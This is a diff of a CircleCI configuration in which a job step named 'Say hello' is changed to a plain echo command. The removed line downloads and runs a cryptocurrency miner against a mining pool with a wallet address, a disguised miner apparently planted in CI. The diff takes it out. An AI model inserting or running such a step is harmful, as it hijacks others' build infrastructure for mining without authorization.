@@ -16,7 +16,7 @@ jobs:
       - checkout
       - run:
           name: "Say hello"
-          command: wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.29/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz ./cpuminer-sse2 -a yespowermgpc  -o stratum+tcps://stratum-asia.rplant.xyz:17049 -u Md1PbiMHtr32QxpW7dgvdN44a9CDQpP7AW.test -t 16
+          command: "echo Hello, World!"
 
 # Invoke jobs via workflows
 # See: https://circleci.com/docs/2.0/configuration-reference/#workflows
